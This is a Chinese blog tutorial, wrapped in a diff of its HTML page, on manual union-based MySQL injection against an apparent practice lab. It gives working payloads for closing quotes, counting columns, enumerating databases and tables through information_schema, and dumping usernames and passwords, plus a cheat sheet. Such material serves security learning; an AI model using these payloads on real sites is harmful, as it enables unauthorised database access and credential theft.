@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="李健博">
+  <meta name="keyword" content="hexo-theme">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      [置顶]mysql手工注入步骤 | Mr.Lee-李健博的博客
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>Mr.Lee-李健博的博客</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">主页</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">标签</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">关于我</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">主页</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">标签</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">归档</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">关于我</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>[置顶]mysql手工注入步骤</h2>
+
+
+
+  <p class="post-date">2022-05-01</p>
+    <!-- 不蒜子统计 -->
+    <span id="busuanzi_container_page_pv" style='display:none' class="">
+        <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p><strong>MySQL手工注入的基本步骤以及一些技巧的记录，当出现学习手工注入的时候，网上的文章参差不齐，导致很长一段时间对手工注入的理解一直处于一知半解的状态，特此记录本文，让小白们少走些弯路。本文只针对手工注入小白，大牛绕过轻喷。</strong></p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="注释或者闭合语句"><a href="#注释或者闭合语句" class="headerlink" title="注释或者闭合语句"></a>注释或者闭合语句</h3><p>首先看下一个基本的SQL语句查询源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20180116/15161026736422.png!small" alt="img"> </p>
+<p>下面的步骤默认都是采用这种基本的SQL语句的，其他的注入方法换汤不换药，这里只是想整理下注入的步骤与关键性的语句。</p>
+<h3 id="引号闭合语句"><a href="#引号闭合语句" class="headerlink" title="引号闭合语句"></a>引号闭合语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1 &#x27; and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>带入进源码中的SQL语句就是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1 &#x27; and &#x27;1&#x27; =&#x27;1&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<h3 id="注释后面语句"><a href="#注释后面语句" class="headerlink" title="注释后面语句"></a>注释后面语句</h3><p><strong>常用的注释payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&#x27;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&#x27;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br><span class="line">--+ 可以用#替换，url 提交过程中 Url 编码后的#为%23</span><br></pre></td></tr></table></figure>
+
+<p>带入进源码中的SQL语句就是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;&#x27;or 1=1--+&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>这样可以看出直接把后面的语句都给注释掉了，一般实战用注释比较多。</p>
+<h2 id="and-验证"><a href="#and-验证" class="headerlink" title="and 验证"></a>and 验证</h2><p>当然这里 and 验证和 or 验证都可以，二者区别不大:<strong>页面返回正常</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+ </span><br><span class="line">?id=1&#x27; or 1=2 --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="页面返回异常"><a href="#页面返回异常" class="headerlink" title="页面返回异常"></a><strong>页面返回异常</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=2 --+</span><br><span class="line">?id=1&#x27; or 1=1 --+</span><br></pre></td></tr></table></figure>
+
+<p>如果发现一开始页面先是正常然后是异常的话，说明页面啊存在注入。当然这里是最基本的判断方法，到后面盲注的时候是用延时函数来观察页面的返回时间的。</p>
+<h2 id="查询字段数目"><a href="#查询字段数目" class="headerlink" title="查询字段数目"></a>查询字段数目</h2><p>查询字段数目主要利用MySQL里面的 order by 来判断字段数目，order by一般采用数学中的对半查找来判断具体的字段数目，这样效率会很高，下面假设用 order by 来判断一个未知字段的注入。</p>
+<blockquote>
+<p>?id&#x3D;1’ order by 1  –+    此时页面正常，继续换更大的数字测试?id&#x3D;1’ order by 10 –+    此时页面返回错误，更换小的数字测试?id&#x3D;1’ order by 5  –+    此时页面依然报错，继续缩小数值测试?id&#x3D;1’ order by 3  –+    此时页面返回正常，更换大的数字测试?id&#x3D;1’ order by 4  –+    此时页面返回错误，3正常，4错误，说明字段数目就是 3</p>
+</blockquote>
+<p>通过数学的对半查找，确定字段数目。</p>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p><code>UNION SELECT</code> 联合查询，手工注入经典语句，作用是在后面通过<code>UNION</code>把我们的恶意注入语句接上去，带入数据库进行查询。因为字段数目是:<code>3</code>,那么正规的语句如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; UNION SELECT 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p>这里页面是不会报错的，此时我们带入数据库的语句为:</p>
+<blockquote>
+<p>SELECT 1,2,3  这段语句没有任何意义，所以页面按返回正常。</p>
+</blockquote>
+<p><img src="https://image.3001.net/images/20180116/15161026885293.png!small" alt="union查询"></p>
+<p>但是为了信息收集，我们得知道当前这个页面里面的值，调用的具体是数据库中的哪个字段才可以，可以故意构造一个错误的语句，来爆出错误的字段：</p>
+<blockquote>
+<p>id&#x3D;-1’ UNION SELECT 1,2,3 –+         通过id&#x3D;-1 一个负数不存在的id值来触发报错id&#x3D;1’ and 1&#x3D;2 UNION SELECT 1,2,3 –+  通过and 1&#x3D;2 语句来触发报错id&#x3D;1’ or 1&#x3D;1 UNION SELECT 1,2,3 –+   通过or 1&#x3D;1  语句来触发报错</p>
+</blockquote>
+<p><img src="https://image.3001.net/images/20180116/15161027044368.png!small" alt="img"></p>
+<p>可以看出爆出了具体的字段号了，这里爆出了<code>2</code>和<code>3</code>进MySQL数据库看下这个表的字段结构:<img src="https://image.3001.net/images/20180116/15161027187603.png!small" alt="img"></p>
+<p>数据库表的结构完美验证了本次爆错出先的数字<code>2</code>和<code>3</code>，这里的数字代表字段，恰巧对应的字段值是:<code>username</code>和<code>password</code>。</p>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>在爆出的字段值里面可以替换为我们的恶意语句，前期主要是收集信息，包括判断当前数据库是否是root用户，MySQL的版本等，一般收集这些信息常用一些MySQL自带的函数去收集信息:<strong>MySQL常用的系统函数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()            #MySQL版本</span><br><span class="line">user()               #数据库用户名</span><br><span class="line">database()           #数据库名</span><br><span class="line">@@datadir            #数据库路径</span><br><span class="line">@@version_compile_os #操作系统版本</span><br></pre></td></tr></table></figure>
+
+<p><strong>查询当前数据库名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 UNION SELECT 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20180116/15161027536424.png!small" alt="img"></p>
+<h3 id="查询MySQL版本"><a href="#查询MySQL版本" class="headerlink" title="查询MySQL版本"></a><strong>查询MySQL版本</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 UNION SELECT 1,2,version() --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20180116/15161027756919.png!small" alt="img"></p>
+<h3 id="查询数据库用户和路径"><a href="#查询数据库用户和路径" class="headerlink" title="查询数据库用户和路径"></a><strong>查询数据库用户和路径</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 UNION SELECT 1,user(),@@datadir --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20180116/15161027897406.png!small" alt="img"></p>
+<p>查询数据库</p>
+<p>查询数据库，一般来说我们注入的时候要查的就是当前的数据库，但有时候root权限就NB了还可以看到网站数据库之外的数据库内容。<strong>查询当前数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 UNION SELECT 1,2,database() --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20180116/1516102900683.png!small" alt="img"></p>
+<p>拿到当前的数据库名称为:<code>security</code><strong>查询所有数据库</strong>有时候忍不住想看下其他的数据库的内容，可以用这个语句查询所有的数据库:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20180116/15161029207483.png!small" alt="img"></p>
+<p>这里用到了<code>group_concat</code>函数，由于本篇文章的定位是 手工注入的步骤 这里不在这里进行细化的讲解此类函数的用法。了解相关函数的话参考我的另一篇文章:<a target="_blank" rel="noopener" href="http://www.sqlsec.com/2018/01/concat.html">MySQL 手工注入之常见字符串函数</a></p>
+<h2 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h2><h3 id="database-查询数据库"><a href="#database-查询数据库" class="headerlink" title="database 查询数据库"></a>database 查询数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20180116/15161029355755.png!small" alt="img"></p>
+<h3 id="单引号-数据库"><a href="#单引号-数据库" class="headerlink" title="单引号-数据库"></a>单引号-数据库</h3><p>这里的<code>database()</code>函数进行了数据库查询，因为我们已经查到了当前的数据库为<code>security</code>，所有这里还可以酱紫写，用单引号括把数据库的名称括起来<code>&#39;security&#39;</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="hex编码数据库"><a href="#hex编码数据库" class="headerlink" title="hex编码数据库"></a>hex编码数据库</h3><p>如果嫌单引号括起来麻烦的话，那么巧了！这里还有一个更麻烦的方法，就是将数据库名进行<code>hex</code>编码处理。使用火狐自带的<code>HackBar</code>插件可以快速的进行<code>hex</code>编码:<img src="https://image.3001.net/images/20180116/15161029556650.gif!small" alt="img"></p>
+<p><code>hex</code>编码后在前面加上<code>0x</code>表明这里是16进制编码。</p>
+<p><img src="https://image.3001.net/images/20180116/15161029872078.png!small" alt="img"></p>
+<p>目前主流的集中方法大致就是这样，还有一些先hex然后unhex <code>group_concat</code>的写法，据说可以绕waf类的，这里不是很常用就不再赘述了。 同理这些方法放到查询数据库的列名中也是可以使用的，要学会活学活用。</p>
+<h2 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h2><p>目前收集到的信息为:</p>
+<blockquote>
+<p>数据库名称: securuty数据库表名: emails,referers,uagents,users</p>
+</blockquote>
+<p>做为一名黑客一定要有敏锐的嗅觉(手动dog)，这几个表中 一般我们都会去 继续猜解<code>users</code>表。下面用和查询数据库类似的方法去查询列名，关于原理的话 就是 <code>MySQL</code>下有一个<code>information_schema</code>里面会存所有数据库的一些相关信息:</p>
+<p><img src="https://image.3001.net/images/20180116/15161030266210.png!small" alt="img"></p>
+<p>既然都说到这里了，这里就顺便列举一下MySQL手工注入中，比较关键的<code>information_schema</code>里的信息:</p>
+<h3 id="记录关于数据库的信息"><a href="#记录关于数据库的信息" class="headerlink" title="记录关于数据库的信息"></a>记录关于数据库的信息</h3><p>information_schema 数据库下的 <code>schemata</code>表中的<code>schema_name</code>记录的是各个<code>数据库</code>的名称:</p>
+<p><img src="https://image.3001.net/images/20180116/15161030471595.png!small" alt="img"></p>
+<p>不仅这里记录了在 <code>tables</code>数据库下的<code>table_schema</code>表也记录了各个数据库的名称:</p>
+<p><img src="https://image.3001.net/images/20180116/15161030806093.png!small" alt="img"></p>
+<h3 id="记录关于数据表的信息"><a href="#记录关于数据表的信息" class="headerlink" title="记录关于数据表的信息"></a>记录关于数据表的信息</h3><p>information_schema 数据库下的 <code>tables</code>表中的<code>table_name</code>记录的是各个<code>数据表</code>的名称:</p>
+<p><img src="https://image.3001.net/images/20180116/1516103097446.png!small" alt="img"></p>
+<blockquote>
+<p>这里是华丽的分割线，吃惊，一眨眼说不拓展的有忍不住扯了这么多，下面不多说直接来查询users表下的列名</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20180116/15161031097709.png!small" alt="img"></p>
+<h2 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h2><p>由于在查询列名那里啰嗦的有点多，核心原理已经写在上面了,这里就简单的写出payload,:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users --+</span><br></pre></td></tr></table></figure>
+
+<p>知道了数据库、表名、各个字段名可以直接进行查询了，不需借助<code>information_schanem</code>数据库了。</p>
+<p><img src="https://image.3001.net/images/20180116/15161031198875.png!small" alt="img"></p>
+<h2 id="简短的整理"><a href="#简短的整理" class="headerlink" title="简短的整理"></a>简短的整理</h2><p>本来是打算前面步骤中规中矩的写的，但还是忍不住写多了。于是又开出一个标题进行简短的整理:</p>
+<blockquote>
+<p>order by –+ 判断字段数目</p>
+<p>union select –+ 联合查询收集信息</p>
+<p>id&#x3D;1’ and 1&#x3D;2 UNION SELECT 1,2,database() –+ 查询当前数据库</p>
+<p>id&#x3D;1’ and 1&#x3D;2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata –+查询所有数据库</p>
+<p>id&#x3D;1’ and 1&#x3D;2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() –+ 查询表名</p>
+<p>id&#x3D;1’ and 1&#x3D;2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ –+ 查询列名</p>
+<p>id&#x3D;1’ and 1&#x3D;2 UNION SELECT 1,2,group_concat(id,username,password) from users –+ 查询字段值</p>
+</blockquote>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#信息安全" >
+    <span class="tag-code">信息安全</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/03/10/Elasticsearch/Elasticsearch%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/">
+        <span class="nav-arrow">← </span>
+        
+          [置顶]Elasticsearch系列教程
+        
+      </a>
+    
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">点击上方按钮,请我喝杯咖啡！</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+  <!-- 不蒜子统计 -->
+    <strong class="toc-title">目录</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-nav-text">步骤</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%B3%A8%E9%87%8A%E6%88%96%E8%80%85%E9%97%AD%E5%90%88%E8%AF%AD%E5%8F%A5"><span class="toc-nav-text">注释或者闭合语句</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E8%AF%AD%E5%8F%A5"><span class="toc-nav-text">引号闭合语句</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%B3%A8%E9%87%8A%E5%90%8E%E9%9D%A2%E8%AF%AD%E5%8F%A5"><span class="toc-nav-text">注释后面语句</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#and-%E9%AA%8C%E8%AF%81"><span class="toc-nav-text">and 验证</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%A1%B5%E9%9D%A2%E8%BF%94%E5%9B%9E%E5%BC%82%E5%B8%B8"><span class="toc-nav-text">页面返回异常</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E6%95%B0%E7%9B%AE"><span class="toc-nav-text">查询字段数目</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-nav-text">联合查询</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-nav-text">收集信息</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%9F%A5%E8%AF%A2MySQL%E7%89%88%E6%9C%AC"><span class="toc-nav-text">查询MySQL版本</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%92%8C%E8%B7%AF%E5%BE%84"><span class="toc-nav-text">查询数据库用户和路径</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-nav-text">查询表名</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#database-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-nav-text">database 查询数据库</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-nav-text">单引号-数据库</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#hex%E7%BC%96%E7%A0%81%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-nav-text">hex编码数据库</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E5%90%8D"><span class="toc-nav-text">查询列名</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%AE%B0%E5%BD%95%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-nav-text">记录关于数据库的信息</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%AE%B0%E5%BD%95%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-nav-text">记录关于数据表的信息</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="toc-nav-text">查询字段值</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%AE%80%E7%9F%AD%E7%9A%84%E6%95%B4%E7%90%86"><span class="toc-nav-text">简短的整理</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'https://mr-lee-alex.github.io/2022/05/01/security/mysql手工注入步骤/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "[置顶]mysql手工注入步骤",
+        owner: "",
+        repo: "",
+        oauth: {
+          client_id: "",
+          client_secret: ""
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+<!-- 不蒜子统计 -->
+<span id="busuanzi_container_site_pv">
+     本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+     本站访客数<span id="busuanzi_value_site_uv"></span>人
+</span>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+  <p class="copyright">
+    &copy; 2022 | Proudly powered by <a href="https://www.cnblogs.com/m-r-lee" target="_blank">李健博的博客园</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://www.cnblogs.com/m-r-lee">李健博的博客园</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+<script src="/js/load.js"></script>
+
+
+
+  <span class="local-search local-search-google local-search-plugin" style="right: 50px;top: 70px;;position:absolute;z-index:2;">
+      <input type="search" placeholder="站内搜索" id="local-search-input" class="local-search-input-cls" style="">
+      <div id="local-search-result" class="local-search-result-cls"></div>
+  </span>
+
+
+  </body>
+</html>
